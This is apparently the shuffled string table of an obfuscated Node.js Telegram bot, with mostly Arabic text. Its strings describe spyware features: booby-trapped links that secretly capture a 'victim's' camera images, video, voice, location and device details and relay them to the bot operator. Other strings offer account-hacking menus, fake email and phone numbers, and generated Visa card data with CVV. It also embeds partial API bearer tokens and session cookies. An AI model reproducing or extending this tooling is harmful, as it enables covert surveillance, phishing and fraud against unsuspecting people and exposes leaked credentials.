        'ORCDp',
        'وخاصه\x20اذا\x20',
        'uploads/',
        'DEGgh',
        'مرحبًا!\x20هذ',
        'تم\x20الصيد\x20ب',
        'سيفر\x201\x20✨',
        'hFpWv',
        'طلب\x20اي\x20اذن',
        'ندما\x20توصل\x20',
        'اسم\x20المحطة',
        'ة.\x20شكراً\x20ل',
        'أنت\x20محظور\x20',
        'irTdI',
        'mSicZ',
        'Frequency',
        'صطناعي\x20الش',
        'لة\x20التي\x20تر',
        'بط\x20دعوة',
        'MHime',
        'ستقبال\x20الا',
        'ع\x20الذكاء\x20ا',
        'لهاتف:\x20',
        'auYBL',
        'ender\x20dete',
        'تفسير\x20الاح',
        'عروفة',
        'حدث\x20خطأ:\x20',
        'ألبانيا\x20🇦🇱',
        'PzJPC',
        'لاستخراج',
        'deviceVers',
        'ee\x20لمعرفة\x20',
        'userLink',
        'now',
        'INjuw',
        'YYYTTTTIII',
        'لرابط\x20ملاح',
        'rong>\x0a\x20\x20\x20\x20',
        'إضافة\x20أسما',
        '12019095nDUXrb',
        'vJiPb',
        ']\x20100%',
        'qfVrb',
        'لخدمة.</st',
        'إيميل\x20الذي',
        '.sid=s%3AN',
        'ئمة\x20الاشتر',
        '➖\x20وقت\x20الإن',
        'RGRKl',
        'خول\x20لرابط\x20',
        'axios',
        'Iixmh',
        'nILUU',
        'ا\x20الخيارت\x20',
        'kVjbG',
        '🇵🇷',
        'تب\x20لي\x20أي\x20ش',
        'جنوب\x20أفريق',
        'type',
        'use',
        '/getNameFo',
        'zfyht',
        'QTgCZ',
        'rce/get/?s',
        'AqrAC',
        'ظر\x20عن\x20رقمي',
        'اتباع\x20الأو',
        'بطًا\x20يبدأ\x20',
        '\x20المحاولة\x20',
        'create_ema',
        'ZBpTc',
        'pzEWG',
        '/submitVoi',
        'HaRIG',
        'البرتغال\x20🇵🇹',
        'deviceType',
        'مل\x20وهمي\x20\x20/',
        'quad',
        'spXSC',
        'البوسنة\x20وا',
        'rm-urlenco',
        'rest-plaus',
        '[▓▓▓▓▓▓░░░',
        'تصفير\x20الذا',
        'HGouQ',
        'لة\x20🌏\x20:\x20',
        'تهك\x20شروط\x20ا',
        'أرسل\x20لي\x20را',
        'PxTPz',
        '\x20موجود:\x20',
        'file',
        'ساحل\x20العاج',
        'ة،\x20حاول\x20مر',
        'ور\x20ابحث\x20عن',
        '/mm',
        'iyhNh',
        'nt:',
        '🇪🇪',
        'Fifth\x20Thir',
        'jycSD',
        '🇦🇫',
        'مل\x20السابق\x20',
        'Invalid\x20re',
        'Gender\x20Det',
        'gcJPx',
        'rm?chatId=',
        'كتابة\x20رسال',
        'CVGwb',
        '\x20لاحقًا.',
        'ظه\x20بزم\x20يكو',
        'ها\x20رقمي\x20ول',
        'اصطناعي\x20🤖',
        '\x0a\x20ارسل\x20الا',
        'evoice.org',
        'yAxfk',
        'ر\x20مجاناً:',
        'eghDC',
        'KALso',
        'messages',
        '_pins/?q=',
        'حقق\x20من\x20جهة',
        'ت\x20خبيثه\x20خا',
        'ing\x20photos',
        'IvmFs',
        '\x20ملف\x20🔒',
        '`\x0a*[-]\x20Val',
        'ycountryco',
        '\x20🔒',
        '🇬🇧',
        'r.html',
        'EUYUX',
        'get',
        'token',
        '➖\x20وقت\x20الان',
        'com-device',
        'CAyAF',
        'der\x20in\x20vid',
        'hTfwD',
        'ن\x20العثور\x20ع',
        'videoData',
        'صوت\x20أنثى',
        'ة\x20في\x20',
        'last_name',
        'ن\x20تفسير\x20حل',
        'vbGGn',
        'سلوفاكيا\x20🇸🇰',
        'uYExv',
        'radio_',
        'PNC\x20Bank',
        'ال\x20معلومات',
        'r/invoke',
        '</code>\x0a<s',
        'NvNpP',
        'h.me/',
        '▓▓▓▓▓▓░░░░',
        'FHvPa',
        'ONUcQ',
        'راق',
        'JYNlf',
        'JZeff',
        'HQebQ',
        'ing\x20video:',
        'dio...\x0a[░░',
        '\x20روبوتًا.',
        'الصومال\x20🇸🇴',
        'ان\x20تخترقك\x20',
        'MY0WW=GS1.',
        '\x20من\x20الخورز',
        'ع\x201نقطه\x20\x0aع',
        'https://ip',
        'MQgNL',
        'ث\x20مباشر\x20ين',
        'aEjut',
        'obs',
        'No\x20images\x20',
        'toLowerCas',
        'images',
        'لبوت.',
        'lKPke',
        'ألمانيا\x20🇩🇪',
        'HeQWz',
        'Csppg',
        'user',
        'GIZxb',
        'فنزويلا\x20🇻🇪',
        'mkdirSync',
        'ومات\x20جهازك',
        'pewVb',
        '\x20الرسائل:',
        'PcAXt',
        'wKpNf',
        'zawfg',
        'mQLlj',
        'DHlIB',
        'لعبة\x20الأذك',
        'rhUtc',
        'pBRYe',
        'انشاء\x20📅\x20:\x20',
        '/completio',
        '\x20يتم\x20إنشاء',
        'ykUFO',
        'ور\x20اجعل\x20ار',
        'أرسل\x20لي\x20اا',
        'دما\x20يقوم\x20ش',
        'find',
        'يه\x202\x20☎️',
        '\x20حتى\x20يتم\x20ا',
        'mtzFP',
        'لقائي\x20',
        '\x20🌍\x0a-\x20شحن\x20ا',
        'ق\x20كامراة\x20م',
        'data',
        'iCWWg',
        'ages?n=',
        'yjvpL',
        '\x20•\x20معلومات',
        'received',
        'U.S.\x20Bank',
        'request_ve',
        'XkNlp',
        'xApyA',
        'غرينلاند\x20🇬🇱',
        'FnbXh',
        'hNwQj',
        'thSHV',
        'ر:\x20',
        'p-indol.ve',
        'Stored\x20and',
        'لم\x20تقم\x20بتج',
        'bFiBy',
        'ion',
        'ghBCC',
        'لا\x20توجد\x20مح',
        'أوكرانيا\x20🇺🇦',
        'إيقاف\x20البر',
        't.me',
        'hKbZn',
        'ح\x20المميزات',
        'om/',
        'YRgzx',
        'rmdirSync',
        'بصوت\x20',
        '🇪🇨',
        '/jpeg;base',
        'VfgFC',
        'mefqL',
        'getUserPro',
        'ccAfC',
        '\x20🏙️\x0a-\x20عنوان',
        'حدثت\x20مشكلة',
        'KVrvB',
        'xcLeO',
        'اعطني\x20نكتة',
        'السلفادور\x20',
        'بلغاريا\x20🇧🇬',
        'PqBDn',
        'UzXkO',
        'السعودية\x20🇸🇦',
        'cXmaC',
        '<strong>•\x20',
        '\x20📶\x20(سرعة:\x20',
        'FaVSM',
        'seWwkhTzrZ',
        '\x20_ga_0YSSR',
        'KKKKEEEE',
        'ص\x20بهم\x20ويثي',
        'callback_q',
        'RIfve',
        '<strong>حد',
        'memory',
        'سحب\x20جميع\x20ر',
        'تم\x20استخدام',
        'ca.html',
        '\x20✋\x0a\x20\x20\x20\x20\x20\x20\x20',
        'تم\x20تصنيفه\x20',
        'reply_mark',
        '\x20والحصول\x20ع',
        '❌\x20النص\x20يجب',
        'book',
        'صور\x20بذكاء\x20',
        'تاريخ_الإن',
        'i4_8m4ZExz',
        'تونس\x20🇹🇳',
        '░]\x2050%',
        'iGYVJ',
        'ق\x20الهاتف\x20ك',
        'ك\x20VIP',
        'UBzdh',
        'JLRzJ',
        'path',
        'lJEUa',
        'cGEQU',
        'ال\x20رابط\x20صح',
        'ختلفه\x20او\x20ح',
        'QzykK',
        'تخدمين:\x20',
        'Bearer\x209va',
        '&duration=',
        'ا\x20الامر\x20/V',
        'زر\x20مرة\x20أخر',
        'qIPtv',
        'jgGOa',
        '==========',
        '🇩🇰',
        'UeNOv',
        '[▓▓░░░░░░░',
        'شاء',
        'أنثى',
        '\x20:\x20',
        'ناء\x20حذف\x20ال',
        '39af7c94f7',
        'Itnia',
        'length',
        '0.0',
        'همي:',
        'ZRzJv',
        '392702',
        'مله\x20ارسلها',
        'تعامل\x20معه\x20',
        'IWMSz',
        'Win64;\x20x64',
        'duzVU',
        'إنشاء\x20إيمي',
        'message_id',
        '😁.',
        '🇸🇪',
        'ontWI',
        'لذي\x20تريد\x20ف',
        'KUDyE',
        'BUCh4hE2VW',
        '\x20هذا\x20البوت',
        'XXYWC',
        'قبة\x20📡',
        'pktrL',
        'WuuVA',
        '\x20المطور',
        'VJdDK',
        'الجبل\x20الأس',
        'للحصول\x20على',
        'Ujvru',
        'ZOgKC',
        'line/cool.',
        'YhIqo',
        'broadcast',
        'انتهت\x20الجل',
        'e/apng,*/*',
        'م\x20مستخدم',
        '\x22scope\x22:\x22p',
        'اللغة\x20الإن',
        'النهائية:',
        'هاز\x20بنجاح',
        'collect_de',
        'PPYtF',
        ')\x20AppleWeb',
        '➖\x20اضغط\x20على',
        '🔗\x20توليد\x20را',
        'utu.be',
        '32jMKjUT',
        'لإحصائيات\x20',
        'RUpgb',
        'مولدوفا\x20🇲🇩',
        'أرمينيا\x20🇦🇲',
        'معرفة\x20نقاط',
        'ZaMzv',
        'mFayr',
        'أذربيجان\x20🇦🇿',
        'ري\x20انشاء\x20ا',
        'meString',
        'SIdfS',
        'dIGEOjpMgZ',
        'لهرسك\x20🇧🇦',
        'sVDcG',
        'eBYMe',
        'تم\x20إرسال\x20م',
        'Wrfkz',
        '&type=tikt',
        'jRkEQ',
        'التردد\x20للا',
        'xOhco',
        '.com',
        '\x20⏰\x0a-\x20اسم\x20ا',
        'ال\x20الخاصة\x20',
        'l,applicat',
        'ات\x20المفحوص',
        'يدة.',
        'ماكاو\x20🇲🇴',
        'network',
        'تم\x20إزالة\x20ا',
        '\x20كل\x2015\x20دقي',
        'creator',
        '\x20📏\x0a-\x20إصدار',
        '2BT3BlbkFJ',
        '<strong>لي',
        'rshq_insta',
        '\x20الي\x2030\x20نط',
        'من\x20هذا\x20الد',
        '/capture',
        'MxyWP',
        'choices',
        'rification',
        '؟:\x20',
        'VhUwx',
        'BRuus',
        'n/x-www-fo',
        'aNzrP',
        'dTLha',
        'nFGoE',
        'k.glitch.m',
        'لرابط:\x20',
        '\x20🖥️\x0a-\x20وضع\x20ا',
        'get_radio_',
        'getChatMem',
        '\x20(KHTML,\x20l',
        'ميع\x20أي\x20نقا',
        'المانيا\x20',
        '\x0aلحذف\x20الاي',
        '\x20🔻\x0a-\x20المدي',
        '🇨🇷',
        'بوك\x20🔮',
        '\x20إيميل\x20وهم',
        '48671:S=AL',
        '\x0a➖\x20تم\x20الطل',
        'امريكا\x20🇺🇸',
        '🇬🇹',
        'wxoTk',
        'facebook.c',
        'dGWDh7czhs',
        'مؤقتة.',
        'files',
        'لنسخها.',
        'لي\x20فريق\x20دع',
        'body-parse',
        'touchSuppo',
        'yxWdM',
        'حدث\x20خطأ',
        'وة\x20الامان\x20',
        'hing\x20joke:',
        '▓▓▓▓▓▓▓]\x201',
        'tSnBy',
        'الضحيه\x20📲',
        '\x0a<strong>ي',
        'نة:\x20',
        '.temp-mail',
        'ط\x20🪄',
        'ercom-sess',
        'uery\x22:\x22',
        'ation',
        'KehDz',
        'IWuhL',
        'mPvFN',
        'HBoXK',
        'لم\x20يتم\x20الع',
        '\x20المحتله\x20🇮🇱',
        '311f59;\x20in',
        '\x20و\x20',
        'KfvcB',
        'غانا\x20🇬🇭',
        'vaZci',
        'CbqHR',
        'يه\x20عبر\x20راب',
        'ice.org/',
        'DCCFt',
        'HkNwI',
        'LSHLB',
        '🇺🇸',
        'صطناعي',
        'بيرو\x20🇵🇪',
        'YDnmk',
        'ZcQVx',
        'ة:\x20',
        'ع\x201نقطه\x20عن',
        '4c5-4ee8-9',
        'زامبيا\x20🇿🇲',
        'اوت',
        'AWYtf',
        'تم\x20اكتشاف\x20',
        'كواد\x20والرس',
        'GsNkU',
        'oOsdW',
        'قبرص\x20🇨🇾',
        'FnQTp',
        'UMUpk',
        'لألوان:\x20',
        'rXQdD',
        'و\x20الثغره\x20ا',
        'Eltup',
        'TGJlh',
        'أخرى\x20لاحق😁',
        'process\x20im',
        'tEmBL',
        '🇵🇭',
        'ستخدمين.',
        'XelQn',
        'ي\x20عن\x20طريق\x20',
        'YaBqR',
        '/k.html?ch',
        'اختراق\x20انس',
        '@hsosgh',
        'NmMQI',
        '0\x20(Linux;\x20',
        'Qfflk',
        'city',
        '\x20⚡\x0a-\x20الشبك',
        'ZEwuJ',
        'لموقع\x20الجغ',
        'ابط\x20دعوة.',
        'يء!',
        'JjevV',
        'ر\x20رابط\x20🔒',
        'إيران\x20🇮🇷',
        'hKiwr',
        'hing\x20love\x20',
        '498WHmDLI',
        'get_photo_',
        'ميانمار\x20🇲🇲',
        '265a6f2719',
        'HLzsi',
        'سلوفينيا\x20🇸🇮',
        'phLOE',
        'SEZrY',
        'trong>',
        '000',
        '9323703ZKacpN',
        '\x20عاليه\x20🖼',
        'رافي:\x20',
        'LWfdj',
        'ت\x20إلى\x20مدفو',
        'ه\x20إلى\x20صوت\x20',
        'MaPQI',
        '\x20زخرفته.',
        'kOmuq',
        'index',
        '.row.messa',
        'UhQNe',
        'لبنان\x20🇱🇧',
        'on/',
        'وامر\x20اخترا',
        'أة\x20ولن\x20يتم',
        'ل\x20عن\x201000ح',
        'ائل\x20للحصول',
        'قطر\x20🇶🇦',
        'mageee',
        '@lTV_l',
        '\x20الإجباري',
        'SHwNX',
        'info/json/',
        'لرجاء\x20المح',
        'Id\x20',
        'w.pinteres',
        '\x20المتصفح:\x20',
        'لبوت\x20إلى\x20م',
        'لشاشة:\x20',
        'multi-ipa-',
        'HOTPW',
        'أستراليا\x20',
        'tKuLJ',
        'dupPK',
        'الأرجنتين\x20',
        'ا\x20لقريق\x20دع',
        '\x20•\x20التصنيف',
        'vvyPu',
        'فتيارات\x20شب',
        'NnLUK',
        'لا\x20توجد\x20صو',
        'indexOf',
        'RtSen',
        'sendVideo',
        '/capture?c',
        'otanL',
        'tcEQJ',
        'tor',
        'RcZmk',
        'receive-sm',
        'rDTsa',
        'لا\x20توجد\x20دو',
        'SIGINT',
        'م\x20🔁',
        'DhNfN',
        'ge:',
        'XXJXYFFVVV',
        'فذ\x20',
        'n/json',
        'd\x20Bank',
        'أرسل\x20حلمك',
        '-\x20بوت\x20بحث\x20',
        'إستونيا',
        't.html',
        '0.9,image/',
        '\x20نقاط\x20للوص',
        '.mb-3',
        'Error\x20send',
        'geolocatio',
        'SyIfr',
        'cZCeR',
        '\x20واحدة\x20فقط',
        'ar-EG,ar;q',
        'هذا\x20لفتح\x20أ',
        'المناسب\x20لل',
        'hUsCL',
        'فنلندا\x20🇫🇮',
        '\x20مللي\x20ثاني',
        'vWWxz',
        'A-AfjZU08m',
        'توغو\x20🇹🇬',
        'zPUur',
        'chatId=',
        'جعلته\x20مشبو',
        '`\x0a*[-]\x20CVV',
        'SxEjz',
        'idence\x20',
        'sUUxl',
        'pBjGZ',
        'bcgCd',
        'لزر\x20للحصول',
        'CzUVb',
        'values',
        'حدث\x20خطأ\x20أث',
        'gKXWm',
        'GdQCC',
        'ميع\x20قنوات\x20',
        'الأردن\x20🇯🇴',
        'chat',
        'mYIQY',
        'رد\x20المناسب',
        'received.',
        'كرواتيا\x20🇭🇷',
        'com',
        'lrWlc',
        'ه\x20وكلمات\x20ج',
        'get_pubg',
        'rQMbW',
        'ync',
        'صطناعي\x20🤖',
        'GWVOM',
        'EqTNj',
        '/whatsapp',
        'on/:linkId',
        'kodDt',
        'xxxTB',
        '🇦🇷',
        'من\x20استخدام',
        'المجر\x20🇭🇺',
        'OoWWW',
        'LUvaU',
        'k\x20:*\x20`',
        'oNoHT',
        'resource_r',
        '➖\x20تاريخ\x20ال',
        'ود\x20هاذا\x20ال',
        'لإيماءات\x20ا',
        'otos',
        'CHUH2h0',
        'ook',
        'لصورة\x20بنجا',
        '/Messages\x0a',
        'min',
        '\x20النص\x20بالإ',
        '<strong>لم',
        'ماليزيا\x20🇲🇾',
        'iver',
        'VISA\x20-\x20DEB',
        'https://ww',
        'https://',
        'base64',
        'XysSW',
        'kxgWG',
        'dtSYa',
        'المرسل:\x20',
        'إندونيسيا\x20',
        'light',
        'ges:',
        'jqiMZ',
        'hkQlP',
        '.responsiv',
        '@hqooosjjd',
        'vice_info',
        'deo:\x20conta',
        'أيرلندا\x20🇮🇪',
        '\x20تلقائي\x20',
        'kicked',
        'لم\x20يتم\x20است',
        'email',
        'tFVru',
        'البوت\x20أصبح',
        'd32hMhN96g',
        '<strong>اه',
        'w.artbreed',
        'LktDa',
        'اختراق\x20اله',
        'زيمبابوي\x20🇿🇼',
        '\x20🔞',
        '\x20كاميرات\x20ا',
        'المستخدم\x20ا',
        'ysjYS',
        'ck/:linkId',
        'التشيك\x20🇨🇿',
        'AdnAW',
        'ي\x20ع\x20الكثير',
        'اليابان\x20🇯🇵',
        'listen',
        '\x20🇰🇬',
        'tgme_usern',
        '\x20اكتبلي\x20رس',
        'ObrNZ',
        'UQFPn',
        'tPpZQ',
        '\x20الجهاز:',
        'ame_link',
        '\x22Not-A.Bra',
        'LEUrA',
        'لى\x20الزر\x20لب',
        '\x20الحساب:*\x0a',
        'pnwvX',
        'bBgeh',
        'ationLV45L',
        'kClDI',
        'editMessag',
        'on...\x0a[▓▓▓',
        'i.internal',
        'code',
        'zNRpF',
        'kHgqC',
        'vKHPz',
        'lPlQp',
        'j1u7p1lXXG',
        'ID=f65db69',
        'Wpurt',
        'ewmig',
        'MVBOh',
        'ont/:linkI',
        'بوت\x20اختراق',
        'gmwGq',
        '\x20جهة\x20الاتص',
        'ول\x20إلى\x2030\x20',
        'أدناه\x20للبح',
        'mKMdz',
        'vipUsers',
        '📸\x20الصوره\x20',
        'gpt-3.5-tu',
        'نكتة',
        'سيفر\x202\x20✨',
        'VtNVK',
        'قة.\x20المتبق',
        '.live/mess',
        'ليوزرات:',
        'sion',
        'entries',
        'NfgEK',
        'الآن.',
        '[▓▓▓▓░░░░░',
        'get_number',
        'معرفة\x20رقم\x20',
        '\x20📱\x0a-\x20الذاك',
        'ont/',
        'هولندا\x20🇳🇱',
        'بـ\x20\x22https\x22',
        'b.html',
        'qUzuI',
        'الدخول\x20\x20له',
        'XiCYi',
        'ية\x20📷',
        'ZmwCj',
        'تم\x20لغيم\x20ال',
        'جاري\x20اخترا',
        '\x20•\x20تفاصيل\x20',
        'TYJsJ',
        'TWenK',
        '1908KmGQzM',
        '🇷🇸',
        'recordVoic',
        '🇱🇧',
        '12c3da25:T',
        'الدومينيكا',
        'sendMessag',
        'erate',
        'ًا.',
        'isCharging',
        'iqCJu',
        '7cd-3eea84',
        'llhLB',
        '\x20📡\x0a-\x20إمكان',
        'voice',
        'rLCVo',
        'أوزبكستان\x20',
        'سوف\x20يتم\x20فت',
        'zhbrN',
        'رة.',
        '.36\x20(KHTML',
        'Error\x20chec',
        ')\x0a\x20\x20\x20\x20\x20\x20',
        'tiktok.com',
        'vFxtc',
        'kljVL',
        'GOJzZ',
        'has',
        'me/lTV_l/3',
        'DlEqF',
        'saPrz',
        'org',
        '\x20الكثير\x20من',
        '.insecam.o',
        'حظر\x20مستخدم',
        'join',
        'VWauE',
        'فشل\x20في\x20إرس',
        '\x20•\x20مزود\x20ال',
        'YCskL',
        'zjtSn',
        '.txt',
        'atus:',
        'Agent',
        'جزر\x20القمر\x20',
        'zdaRx',
        '\x20المدفوع\x20ت',
        'NNgmo',
        'إرسال_رسال',
        'PjzpQ',
        'connection',
        'باراغواي\x20🇵🇾',
        'same-origi',
        'xPook',
        '\x20اسمك.',
        'UUmfC',
        'رجاء\x20\x20عدم\x20',
        'zakCI',
        'XOhgt',
        '\x20استخدام\x20ا',
        'PweUV',
        'skuFH',
        'عبر\x20رابط\x20🔒',
        'Bearer\x20sk-',
        '\x20processed',
        'ت\x20الخبيثه\x20',
        'USA🇺🇸',
        'er-detecto',
        'prev_',
        'tHjXs',
        '`\x0a*[-]\x20Car',
        'ltxNr',
        'xtViN',
        'deviceInfo',
        '@uiit89',
        'UfpDC',
        'WrKhF',
        'تحويل\x20النص',
        'd06cd9273e',
        'BeMPf',
        'test',
        'T=17282486',
        '%\x20🔋\x0a-\x20هل\x20ا',
        '\x0a𝗣𝗮𝘀𝘀𝗲𝗱\x20✅\x0a',
        'GjAsf',
        'on...\x0a[░░░',
        'ins\x22}}',
        'data:image',
        'طلب\x20الكود\x20',
        'st.\x0a-\x20اضغط',
        'CyWzG',
        'ins\x20woman',
        'وله\x20بسبب\x20ق',
        'iNBTo',
        'F%2Fwww.bl',
        'تركمانستان',
        'map',
        'tjToC',
        'trim',
        'SBKkj',
        'Bank\x20of\x20Am',
        '248671:S=A',
        'يره\x20جداً\x20ب',
        'xnoMs',
        'معلومات\x20حس',
        'composer-i',
        'cSirG',
        'NlNoy',
        'حلمك.\x20التف',
        'ZNVTw',
        'greencafe2',
        'split',
        'send_dream',
        'iGTEN',
        '\x20الأرقام:\x20',
        'CUhki',
        '/submitVid',
        'روسيا',
        'تلغيم\x20رابط',
        'تصوير\x20الضح',
        'لى\x20رابط\x20ال',
        'FlzRm',
        'بريطانيا',
        'رى\x20لاحقًا.',
        'XdVJX',
        'آمن.',
        'ور\x20الهاتف\x20',
        'numbers/',
        'board',
        '`\x0a*[-]\x20Cou',
        'countries',
        'check_link',
        'e\x20Visa!*',
        'diXGK',
        'لاحقاً.',
        'ing\x20Telegr',
        '\x20الثانية)\x0a',
        'jHehc',
        'ر\x20أو\x20الرد\x20',
        'hotos:\x20',
        'اولة\x20مرة\x20أ',
        'EAuFC',
        '➖\x20المنصه\x20🔮',
        '\x20🧠\x0a-\x20الذاك',
        'فرنسا',
        'KxjMw',
        'FyYIU',
        '\x20الصور',
        '/getLocati',
        'القناة\x20لإض',
        'r\x20data\x20for',
        'لغه\x20الروسي',
        'am\x20message',
        'qSpCR',
        '528-4e2e-a',
        'inkId',
        'تنزانيا\x20🇹🇿',
        'س\x20لديك\x20ايم',
        'رابط\x20جمع\x20ا',
        'W5B7mU',
        'غيل:\x20',
        'cKgVR',
        'إزالة\x20مستخ',
        'https://mo',
        'zgXJR',
        'get_link_',
        '?start=',
        'إيطاليا\x20🇮🇹',
        '<strong>قم',
        'ksIpI',
        'ن\x20التعامل\x20',
        'dio...\x0a',
        'qWCnK',
        '/webp,imag',
        'تفسير\x20الأح',
        'g.html',
        'HNJRK',
        't-break',
        '/ca',
        'mage',
        'XhYuT',
        'mdRZqoXRZ_',
        'bPhaE',
        '/start',
        'hKqQp',
        'YTlBB',
        'الدنمارك',
        'WGAYx',
        'nzBZR',
        'link',
        'ابط\x20التقاط',
        'skagd',
        'قاط\x20الصور.',
        'convert_te',
        'https://yo',
        '🇲🇷',
        '\x20نقاط.\x20تحت',
        'a84fb7f79a',
        'Markdown',
        'deleteMess',
        'rg/en/byco',
        'ar,en-US;q',
        'الذي\x20يمكن\x20',
        'JQXiy',
        'افتها\x20إلى\x20',
        'toISOStrin',
        '/so',
        'oc_YmPU_CJ',
        'EGtuE',
        'بعد</stron',
        'لقد\x20قمت\x20بط',
        'ول\x20الي\x20الر',
        '🇨🇲',
        'GbKjd',
        '\x20رقم\x20وهمي',
        'kODbP',
        '\x20في\x20جهاز\x20ا',
        '⚠️:\x0a',
        'zaouk',
        'add_vip',
        '/json',
        'kBpGJ',
        'جرب\x20دوله\x20م',
        '\x20صوت.',
        'psErd',
        'get_joke',
        '.msg\x20span',
        'ال\x20الرابط\x20',
        'jLOAq',
        'تم\x20تخزين\x20و',
        'gIbEi',
        'VqOBS',
        'zvLMP',
        'randomByte',
        'videos',
        'hfaIk',
        'dotenv',
        '-id-jlmqxi',
        'الدنمارك\x20🇩🇰',
        'for\x20chatId',
        'BxIqJ',
        ';q=0.8,app',
        'رمز_الدولة',
        'KcNqZ',
        'wRung',
        'علومات\x20الج',
        'lo.html',
        'message:',
        'l.ltr.gree',
        'https://ap',
        'منغوليا\x20🇲🇳',
        'الرجاء\x20الم',
        '🚫\x20الفيديو\x20',
        'ReesR',
        'untry/',
        'sendLocati',
        'aGxNA',
        'م\x20في\x20طلب\x20ك',
        'تركين.',
        'لخاص\x20بك:\x20',
        'اختراق\x20سنا',
        'chTvQ',
        'البرتغال',
        'message',
        'افته\x20كـ\x20VI',
        'BHJIP',
        'first_name',
        '-\x20نوع\x20الات',
        'qAhCu',
        'process\x20vi',
        'دثة\x20جديدة.',
        'لهاتف\x20يشحن',
        'wQMwG',
        'JxsTQ',
        'zakhrafa',
        'ادثة\x20الخاص',
        '\x20لك\x0a\x20يوجد\x20',
        'tsMFa',
        'GpbfE',
        'GtjqO',
        'VXMJV',
        'sICdd',
        'http://www',
        'امرا\x20الأما',
        'المحادثة\x20م',
        'OfZiW',
        'oVtkR',
        'لخدمه\x20الخا',
        '\x20أي\x20رسالة\x20',
        'ستفسار\x0a\x20ال',
        'في\x20الطلب.',
        'ZpCuF',
        'لا\x20يمكنك\x20ا',
        '\x20للمتصفح:\x20',
        'jpeg',
        'تحويل\x20البو',
        '░░░░░░░░]\x20',
        'ناء\x20إرسال\x20',
        '\x20الضحيه\x20عب',
        'yIRQx',
        'ام\x20بنجاح.',
        'browserVer',
        'cnrmZ',
        '\x20أسماء\x20الم',
        'express',
        'llllllllll',
        'قم\x20بإرسال\x20',
        'اول\x20مره\x20اخ',
        'cgsuZ',
        'rating\x20ima',
        'بليز\x20🇧🇿',
        'أعطيني\x20نكت',
        'nQJAO',
        'المزيد',
        'البرازيل\x20',
        'لم\x20يتم\x20الت',
        'Please\x20con',
        'alRNf',
        'user_id',
        'سحب\x20جميع\x20ا',
        'VychT',
        'غيرنزي\x20🇬🇬',
        'م\x20تيك\x20توك\x20',
        'UnMgC',
        '.jpg',
        '❗\x20خطأ\x20في\x20ت',
        'yZvNQ',
        'كازاخستان\x20',
        'باكستان\x20🇵🇰',
        'لذي\x20رسلك\x20ه',
        'JyhKa',
        'ل\x20مره\x20اخرى',
        'slice',
        'حلمك،\x20يرجى',
        'phone_numb',
        '/v1/text:s',
        'OwfYP',
        'LCcGC',
        '1833622bRTcHu',
        'صال:\x20',
        '=0.9,en;q=',
        'مك\x20المنحرف',
        'ذكاء\x20الاصط',
        'بنما\x20🇵🇦',
        ';\x20K)\x20Apple',
        'BSgMh',
        'o-browser.',
        'أوغندا\x20🇺🇬',
        'fQSDC',
        'imduz',
        'UkAIp',
        '\x20المراقبه\x20',
        '9eljas1o08',
        'امر\x20التالي',
        'get_love_m',
        'sNeHa',
        'ستخدم:\x20',
        'إختراق\x20ببج',
        'UiewR',
        'شبه\x20ثلاثية',
        'JNnIa',
        'vTgSb',
        'results',
        'bZJzl',
        'php',
        'jqNQJ',
        'pLGgC',
        'mcBpn',
        'ل\x20بنجاح:\x0a<',
        'ription\x20st',
        'rmTQt',
        'لا\x20بك\x20:\x20|\x20',
        'IjTVY',
        '92702;\x20int',
        '\x20كل\x20الازرا',
        'buffer',
        'ي\x20في\x20لوحة\x20',
        'لاوس\x20🇱🇦',
        'ل\x20على\x20المن',
        'iIMou',
        'mZkQG',
        'PORT',
        'nEtAG',
        'ZYkxx',
        'MSpBm',
        'eed\x22:true,',
        'rvBUt',
        'KYYBn',
        'KROPF',
        'qJXiy',
        'ن\x20🇩🇴',
        'lication/s',
        'YxEqS',
        'مستخدم\x20لإز',
        'لجميع\x20المو',
        'فيتنام\x20🇻🇳',
        'Error\x20in\x20g',
        'توباغو\x20🇹🇹',
        'ue\x20:*\x20`',
        'لم\x20يتم\x20اخت',
        'lTikN',
        'urlencoded',
        '/record/',
        'مكنك\x20إنشاء',
        'nAvailable',
        '\x20stations:',
        '🇱🇺',
        'الدردشة\x20مع',
        'yUlEr',
        'تم\x20اختراق\x20',
        'غط\x20على\x20الز',
        'secondName',
        'ير\x20هذا\x20الر',
        'قر\x20على\x20الز',
        'URjEl',
        'رجيه\x20لكتشا',
        'chxrl',
        'toLocaleTi',
        'IyrLp',
        'AsFFn',
        'fLMZI',
        'VihnG',
        'HYLDQ',
        'KkkAe',
        'تريد\x20تحويل',
        'كوريا\x20الجن',
        'دولة\x20غير\x20م',
        'from',
        'QkzjI',
        'مطور.',
        'rQIEz',
        'SbLPd',
        'clck',
        'query',
        'تم\x20الانتها',
        'RUxVj',
        'UuGdQ',
        'HHuES',
        'الضحية\x20🎤',
        '/?page=',
        'qoVNk',
        'ل\x20كود\x20الرق',
        '\x20حذف\x20حسابك',
        '\x20🇰🇾',
        'ى\x20لبدء\x20محا',
        'انتهت\x20المح',
        'vkOSU',
        'Zqbzw',
        'Wells\x20Farg',
        'موريتانيا\x20',
        'olnames.on',
        'ration',
        'mLoWB',
        '\x0aلعرض\x20الرس',
        'ر\x20القلق\x20ضي',
        'qQNzu',
        'sllDa',
        'BXFGu',
        'zhRTX',
        'لقد\x20قام\x20ال',
        'إسبانيا',
        'reckD',
        'age',
        'GkyXj',
        '311f59',
        'banUser',
        'start_priv',
        'ل\x20وهمي\x20💌',
        'each',
        '&type=face',
        'KPaKJ',
        'json',
        '/ca.html',
        'https://sm',
        'عية',
        '93c-4a323e',
        'الكثير\x20من\x20',
        'AUvaU',
        'GcxxP',
        'لديك\x20جلسة\x20',
        'confidence',
        'Bssbc',
        'gqJMm',
        'fetch\x20visa',
        'https://iw',
        'ejbrB',
        'semi_tripl',
        '=0.9,en-US',
        'إزالة\x20قنوا',
        'PcJFu',
        'jbcoX',
        'يا\x20🇿🇦',
        'countryCod',
        'set',
        'iLKvh',
        'TMwVc',
        'املاً\x20قم\x20ب',
        'neNumber',
        'rciPd',
        'uorescent-',
        'كاليدونيا\x20',
        'hing\x20radio',
        'لة\x20حالياً',
        'لرابط\x20إليك',
        'ل\x20النص\x20إلى',
        '?limit=',
        'get_camera',
        'HNPeK',
        'assistant',
        'POST',
        'رام.',
        '<strong>تم',
        'glitch',
        'emfbn',
        '.com/',
        'BmaQu',
        '🇭🇰',
        '\x20أن\x20يكون\x20ب',
        '➖\x20تاريج\x20ال',
        'اختراق\x20ببج',
        'i.html',
        'JISUa',
        'MIvyM',
        'aiii',
        'otocol',
        'aSjAD',
        'eReplyMark',
        'CQLzR',
        'et=UTF-8',
        '\x20اي\x20صوره\x20ف',
        'fhZZx',
        'ة:</strong',
